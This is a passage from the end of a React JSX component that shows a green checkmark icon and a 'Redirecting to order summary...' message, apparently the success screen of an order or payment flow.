                <div style={{ margin: '20px 0' }}>
                  <div className="brand-icon-circle success-bg" style={{ margin: '0 auto' }}>
                    <svg width="40" height="40" viewBox="0 0 40 40">
                      <circle cx="20" cy="20" r="20" fill="#4caf50" />
                      <text x="50%" y="56%" dominantBaseline="middle" textAnchor="middle" fill="#fff" fontSize="24">✓</text>
                    </svg>
                  </div>
                </div>
                <p style={{ fontSize: '14px', color: '#555' }}>Redirecting to order summary...</p>
              </>
            )}
          </div>
        </div>
      )}
    </>
  );
}
